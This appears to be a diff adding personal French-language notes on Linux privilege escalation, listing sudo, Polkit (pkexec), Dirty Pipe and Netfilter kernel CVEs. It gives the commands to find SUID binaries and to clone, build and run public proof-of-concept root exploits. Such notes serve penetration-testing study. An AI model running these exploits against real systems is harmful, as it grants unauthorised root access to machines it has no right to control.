@@ -1,0 +1,37 @@
+##0_Days linux privesc
+
+#Sudo CVE-2021-3156 et CVE-2019-14287
+
+#Polkit
+Service d'authorisation, fonctionne avec deux groupes de fichiers
+1. Actions/Politiques --> /usr/share.polkit-1/actions
+2. Règles --> /usr/share/polkit-1/rules.d
+
+Utiliser l'outil pkexec fourni avec Polkit --> Mêmes taches sur Sudo
+Utiliser la CVE-2021-4034 (POLKIT) --> https://github.com/arthepsy/CVE-2021-4034
+
+#Dirty Pipe
+Utiliser CVE-2022-0847
+exploit-1 --> Restoration de /etc/passwd à partir de /tmp/passwd.bak
+exploit-2 --> Execution de SUID bins avec les privs root 
+	Trouver les bins suid:
+	find / -perm -4000 2>/dev/null
+	Choisir un binary puis exploit:
+	./exploit-2 <PATH_TO_BIN>
+
+#Netfilter (ATTENTION !! --> Exploits instables <-- ATTENTION)
+
+Trois fonctions --> Defragmentation des paquets, tracking des connexions, NAT
+Quand le module "kernel" est actif, l'application est vulnérable aux vulns:
+	CVE-2021-22555 (kernel ver. 2.6 - 5.11) 
+		https://raw.githubusercontent.com/google/security-research/master/pocs/linux/cve-2021-22555/exploit.c
+	CVE-2022-1015 
+	CVE-2022-25636 (kernel ver. 5.4 - 5.6.10) 
+		git clone https://github.com/Bonfee/CVE-2022-25636.git
+		cd dir
+		make
+		./exploit
+	CVE-2023-32233 (kernel ver. <6.3.1) 
+		git clone https://github.com/Liuk3r/CVE-2023-32233
+		cd CVE-2023-32233
+		gcc -Wall -o exploit exploit.c -lmnl -lnftnl
